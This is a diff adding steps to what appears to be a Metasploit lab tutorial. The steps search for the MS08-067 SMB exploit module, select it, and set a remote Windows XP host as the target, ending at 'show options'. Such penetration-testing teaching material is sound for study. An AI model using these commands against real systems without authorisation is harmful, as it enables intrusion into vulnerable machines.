@@ -31,5 +31,16 @@
 - To see list of exploits, type `show exploits`
 	- List of exploits and CVE numbers will be displayed
 - To search for exploits related to SMB, type `search smb`
-- 
+- To search for exploits related to MS08-067, type `search ms08_067`
 
+1. Look for info on the exploit `ms08_067_netapi` and use it
+```
+info windows/smb/ms08_067_netapi
+use windows/smb/ms08_067_netapi
+```
+2. At the exploit prompt, type `show options`
+3. Set a remote host to target (RHOST)
+```
+set RHOST WinXP-IP
+```
+4. Type `show options`
